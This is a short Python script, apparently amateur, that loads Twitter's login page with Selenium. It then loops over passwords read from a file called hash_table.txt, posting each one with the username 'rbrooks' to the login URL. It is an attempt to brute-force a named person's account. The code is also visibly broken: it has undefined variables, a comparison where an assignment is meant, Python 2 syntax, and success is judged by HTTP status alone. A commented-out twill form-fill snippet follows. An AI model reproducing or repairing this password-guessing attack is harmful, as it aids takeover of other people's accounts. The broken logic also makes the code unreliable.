from selenium import webdriver
import requests
driver = webdriver.Chrome()

url = 'https://twitter.com/login'
driver.get(url)

usr_box = driver.find_element_by_name('session[username_or_email]')
usr_box.send_keys(usr)
pwd_box = driver.find_element_by_name('session[password]')
pwd_box.send_keys(pwd)
success = 1
pass_dict = {}
with open('hash_table.txt') as f:
    for line in f:
        key, val = line.split(':')
        pass_dict[key] = val
        values = {'username': 'rbrooks',
                  'password': pass_dict[key]}
        if success == 1:
            r = requests.post(url, data=values)
            if r.status_code == requests.codes.ok:
                success == 0

print success


'''from twill.commands import *
go('url')
fv("1", "email-email", "blabla.com")
fv("1", "password-clear", "testpass")

submit('0')'''
